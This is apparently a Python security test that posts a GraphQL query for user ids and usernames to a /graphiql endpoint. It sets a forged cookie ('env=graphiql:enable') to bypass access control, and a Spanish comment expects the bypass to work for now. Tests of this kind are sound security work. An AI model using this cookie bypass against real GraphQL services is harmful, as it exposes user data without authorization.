import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from common import URL
import requests

def test_graphiql_bypass_cookie():
    query = {
        "query": """
        {
            users {
                id
                username
            }
        }
        """
    }

    response = requests.post(
        URL + "/graphiql",
        json=query,
        cookies={"env": "graphiql:enable"}
    )

    print("Respuesta:", response.text)
    
    # Esperamos que el bypass funcione (por ahora)
    assert response.status_code == 200
    assert "users" in response.text or "data" in response.text
